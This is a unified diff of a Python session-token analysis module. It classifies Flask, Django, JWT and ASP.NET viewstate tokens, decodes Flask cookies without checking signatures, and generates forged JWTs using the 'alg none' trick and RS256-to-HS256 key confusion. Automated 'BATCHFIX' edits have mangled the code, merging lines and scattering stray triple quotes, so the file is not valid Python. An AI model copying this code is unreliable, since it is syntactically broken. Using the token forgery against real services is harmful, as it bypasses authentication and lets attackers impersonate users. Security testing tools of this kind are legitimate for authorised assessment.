@@ -1,14 +1,12 @@
 #!/usr/bin/env python3
 # Copyright 2026 PyAgent Authors
-# Licensed under the Apache License, Version 2.0 (the "License");
-# you may not use this file except in compliance with the License.
+# Licensed under the Apache License, Version 2.0 (the "License");"# you may not use this file except in compliance with the License.
 # You may obtain a copy of the License at
 #
 #     http://www.apache.org/licenses/LICENSE-2.0
 #
 # Unless required by applicable law or agreed to in writing, software
-# distributed under the License is distributed on an "AS IS" BASIS,
-# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
+# distributed under the License is distributed on an "AS IS" BASIS,"# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 # See the License for the specific language governing permissions and
 # limitations under the License.
 
@@ -23,117 +21,73 @@ from typing import Optional, Dict, List
 class SessionIntelligence:
 # [BATCHFIX] Commented metadata/non-Python
 #     pass  # [BATCHFIX] inserted for empty class
-"""Identifies and analyzes session cookies/tokens for common frameworks."""
-#     Refactored from badsecrets.
-"""
-
+"""Identifies and analyzes session cookies/tokens for common frameworks."""""""#     Refactored from badsecrets.
+"""""""
     PATTERNS = {
 # [BATCHFIX] Commented metadata/non-Python
-""" [BATCHFIX] Commented unterminated string
-#         "flask": re.compile(reyJ(?:[\w-]*\.)(?:[\w-]*\.)[\w-]*"),"  # [BATCHFIX] closed string
-# [BATCHFIX] Commented metadata/non-Python
-""" [BATCHFIX] Commented metadata/non-Python
-# [BATCHFIX] Commented metadata/non-Python
-"""         "django": re.compile(r"^[\.a-zA-z-0-9]+:[\.a-zA-z-0-9:]+$"),
-# [BATCHFIX] Commented metadata/non-Python
-""" [BATCHFIX] Commented metadata/non-Python
-# [BATCHFIX] Commented metadata/non-Python
-"""         "jwt": re.compile(r"^ey[A-Za-z0-9-_=]+\.ey[A-Za-z0-9-_=]+\.[A-Za-z0-9-_=]*$"),
-# [BATCHFIX] Commented metadata/non-Python
-""" [BATCHFIX] Commented metadata/non-Python
-# [BATCHFIX] Commented metadata/non-Python
-"""         "aspnet_viewstate": re.compile(r"^/wEP[A-Za-z0-9+/=]+$"),
-    }
+""" [BATCHFIX] Commented unterminated string""""#         "flask": re.compile(reyJ(?:[\\w-]*\\.)(?:[\\w-]*\\.)[\\w-]*"),"  # [BATCHFIX] closed string"# [BATCHFIX] Commented metadata/non-Python
+""" [BATCHFIX] Commented metadata/non-Python""""# [BATCHFIX] Commented metadata/non-Python
+"""         "django": re.compile(r"^[\\.a-zA-z-0-9]+:[\\.a-zA-z-0-9:]+$"),"# [BATCHFIX] Commented metadata/non-Python
+""" [BATCHFIX] Commented metadata/non-Python""""# [BATCHFIX] Commented metadata/non-Python
+"""         "jwt": re.compile(r"^ey[A-Za-z0-9-_=]+\\.ey[A-Za-z0-9-_=]+\\.[A-Za-z0-9-_=]*$"),"# [BATCHFIX] Commented metadata/non-Python
+""" [BATCHFIX] Commented metadata/non-Python""""# [BATCHFIX] Commented metadata/non-Python
+"""         "aspnet_viewstate": re.compile(r"^/wEP[A-Za-z0-9+/=]+$"),"    }
 
     @classmethod
 # [BATCHFIX] Commented metadata/non-Python
-""" [BATCHFIX] Commented metadata/non-Python
-# [BATCHFIX] Commented metadata/non-Python
-"""     def identify_session(cls, cookie_value: str) -> Optional[str]:
-""""Identifies the type of session token based on regex patterns."""
-        for name, pattern in cls.PATTERNS.items():
+""" [BATCHFIX] Commented metadata/non-Python""""# [BATCHFIX] Commented metadata/non-Python
+"""     def identify_session(cls, cookie_value: str) -> Optional[str]:""""""""Identifies the type of session token based on regex patterns."""""""        for name, pattern in cls.PATTERNS.items():
             if pattern.match(cookie_value):
                 return name
         return None
 
     @staticmethod
 # [BATCHFIX] Commented metadata/non-Python
-""" [BATCHFIX] Commented metadata/non-Python
+""" [BATCHFIX] Commented metadata/non-Python""""# [BATCHFIX] Commented metadata/non-Python
+"""     def generate_jwt_attacks(token: str, public_key: Optional[str] = None) -> List[str]:""""        Generates JWT algorithm confusion and 'none' attack tokens.'        Ported from 0xSojalSec-Confusional.
+"""""""        parts = token.split(".")"        if len(parts) != 3:
 # [BATCHFIX] Commented metadata/non-Python
-"""     def generate_jwt_attacks(token: str, public_key: Optional[str] = None) -> List[str]:
-        Generates JWT algorithm confusion and 'none' attack tokens.
-        Ported from 0xSojalSec-Confusional.
-"""
-        parts = token.split(".")
-        if len(parts) != 3:
-# [BATCHFIX] Commented metadata/non-Python
-""" [BATCHFIX] Commented metadata/non-Python
-# [BATCHFIX] Commented metadata/non-Python
-"""             return []
-
+""" [BATCHFIX] Commented metadata/non-Python""""# [BATCHFIX] Commented metadata/non-Python
+"""             return []""""
         header_b64, payload_b64, signature_b64 = parts
         try:
             # Handle padding
             def b64_decode(s):
-                return base64.urlsafe_b64decode(s + "=" * (4 - len(s) % 4))
-
+                return base64.urlsafe_b64decode(s + "=" * (4 - len(s) % 4))"
             header_json = json.loads(b64_decode(header_b64).decode())
             _ = header_json  # Mark as used via variable
         except Exception:
 # [BATCHFIX] Commented metadata/non-Python
-""" [BATCHFIX] Commented metadata/non-Python
+""" [BATCHFIX] Commented metadata/non-Python""""# [BATCHFIX] Commented metadata/non-Python
+"""             return []""""
 # [BATCHFIX] Commented metadata/non-Python
-"""             return []
-
-# [BATCHFIX] Commented metadata/non-Python
-""" [BATCHFIX] Commented metadata/non-Python
-# [BATCHFIX] Commented metadata/non-Python
-"""         attacks = []
-
-        # 1. Algorithm 'none'
-# [BATCHFIX] Commented metadata/non-Python
-""" [BATCHFIX] Commented metadata/non-Python
-# [BATCHFIX] Commented metadata/non-Python
-"""         none_headers = [{"alg": "none", "typ": "JWT"}, {"alg": "None", "typ": "JWT"}, {"alg": "nOnE", "typ": "JWT"}]
-        for nh in none_headers:
-            h_b64 = base64.urlsafe_b64encode(json.dumps(nh).encode()).decode().rstrip("=")
-            attacks.append(f"{h_b64}.{payload_b64}.")
-
+""" [BATCHFIX] Commented metadata/non-Python""""# [BATCHFIX] Commented metadata/non-Python
+"""         attacks = []""""
+        # 1. Algorithm 'none''# [BATCHFIX] Commented metadata/non-Python
+""" [BATCHFIX] Commented metadata/non-Python""""# [BATCHFIX] Commented metadata/non-Python
+"""         none_headers = [{"alg": "none", "typ": "JWT"}, {"alg": "None", "typ": "JWT"}, {"alg": "nOnE", "typ": "JWT"}]"        for nh in none_headers:
+            h_b64 = base64.urlsafe_b64encode(json.dumps(nh).encode()).decode().rstrip("=")"            attacks.append(f"{h_b64}.{payload_b64}.")"
         # 2. RS256 to HS256 Confusion
         if public_key:
             # If we have the public key, we use it as the HMAC secret
             secret = public_key.encode()
-            hs_header = {"alg": "HS256", "typ": "JWT"}
-            h_b64 = base64.urlsafe_b64encode(json.dumps(hs_header).encode()).decode().rstrip("=")
-
-            signing_input = f"{h_b64}.{payload_b64}".encode()
-            sig = hmac.new(secret, signing_input, hashlib.sha256).digest()
-            sig_b64 = base64.urlsafe_b64encode(sig).decode().rstrip("=")
-            attacks.append(f"{h_b64}.{payload_b64}.{sig_b64}")
-
+            hs_header = {"alg": "HS256", "typ": "JWT"}"            h_b64 = base64.urlsafe_b64encode(json.dumps(hs_header).encode()).decode().rstrip("=")"
+            signing_input = f"{h_b64}.{payload_b64}".encode()"            sig = hmac.new(secret, signing_input, hashlib.sha256).digest()
+            sig_b64 = base64.urlsafe_b64encode(sig).decode().rstrip("=")"            attacks.append(f"{h_b64}.{payload_b64}.{sig_b64}")"
         return attacks
 
     @classmethod
 # [BATCHFIX] Commented metadata/non-Python
-""" [BATCHFIX] Commented metadata/non-Python
-# [BATCHFIX] Commented metadata/non-Python
-"""     def decode_flask_cookie(cls, cookie: str) -> Optional[Dict]:
-""""Decodes the payload part of a Flask session cookie without verification."""
-        try:
+""" [BATCHFIX] Commented metadata/non-Python""""# [BATCHFIX] Commented metadata/non-Python
+"""     def decode_flask_cookie(cls, cookie: str) -> Optional[Dict]:""""""""Decodes the payload part of a Flask session cookie without verification."""""""        try:
             # Flask cookies are serialized with itsdangerous (base64 of json)
 # [BATCHFIX] Commented metadata/non-Python
-""" [BATCHFIX] Commented metadata/non-Python
-# [BATCHFIX] Commented metadata/non-Python
-"""             # Format: .[base64_payload].[sig] or [base64_payload].[sig]
-            parts = cookie.split(".")
-# [BATCHFIX] Commented metadata/non-Python
-""" [BATCHFIX] Commented metadata/non-Python
-# [BATCHFIX] Commented metadata/non-Python
-"""             payload = parts[0] if not cookie.startswith(".") else parts[1]
-
+""" [BATCHFIX] Commented metadata/non-Python""""# [BATCHFIX] Commented metadata/non-Python
+"""             # Format: .[base64_payload].[sig] or [base64_payload].[sig]""""            parts = cookie.split(".")"# [BATCHFIX] Commented metadata/non-Python
+""" [BATCHFIX] Commented metadata/non-Python""""# [BATCHFIX] Commented metadata/non-Python
+"""             payload = parts[0] if not cookie.startswith(".") else parts[1]"
             # Add padding
-            payload += "=" * (4 - len(payload) % 4)
-            decoded = base64.urlsafe_b64decode(payload)
+            payload += "=" * (4 - len(payload) % 4)"            decoded = base64.urlsafe_b64decode(payload)
             return json.loads(decoded)
         except Exception:
             return None
